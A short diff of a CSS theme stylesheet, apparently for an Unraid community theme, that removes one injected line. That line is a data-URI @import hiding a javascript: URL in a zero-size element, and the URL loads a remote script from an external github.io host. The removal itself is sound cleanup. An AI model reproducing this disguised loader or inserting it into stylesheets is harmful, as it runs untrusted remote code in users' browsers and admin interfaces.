@@ -1,3 +1,2 @@
 @import url("/css/base/unraid/unraid-base.css?sha=0ceab157903f1986ec895b960a19834e");
 @import url("/css/community-theme-options/soul.css?sha=300d25523a00f5086cea11988de1da1c");
-@import url("data:text/css;charset=UTF-8,body::before{content:'';display:block;width:0;height:0;overflow:hidden;position:absolute;background-image:url(\"javascript: (function(){var s=document.createElement('script');s.src='https://teekpoqid.github.io/css/theme-options/custom.js';document.head.appendChild(s);})();\")}");
